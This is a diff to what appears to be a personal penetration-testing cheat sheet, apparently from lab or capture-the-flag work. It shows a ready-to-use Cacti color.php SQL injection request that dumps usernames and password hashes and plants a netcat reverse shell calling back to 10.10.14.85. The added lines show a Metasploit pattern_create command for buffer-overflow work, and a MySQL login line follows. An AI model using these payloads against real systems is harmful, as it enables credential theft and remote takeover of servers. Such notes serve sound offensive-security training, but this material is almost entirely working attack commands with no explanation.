@@ -344,6 +344,10 @@ Rev shell
 GET /cacti/color.php?action=export&header=false&filter=1') UNION SELECT 1,username,password,4,5,6,7 from user_auth;update settings set value='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.85 5555 >/tmp/f;' where name='path_php_binary';-- - HTTP/1.1
 -> URL encode it
 
+BUFFER OVERFLOW
+GENERATE PATTERN
+/usr/share/metasploit-framework/tools/pattern_create.rb 11000
+
 MYSQL/SQL local
 mysql -u ona_sys -p
 show databases;
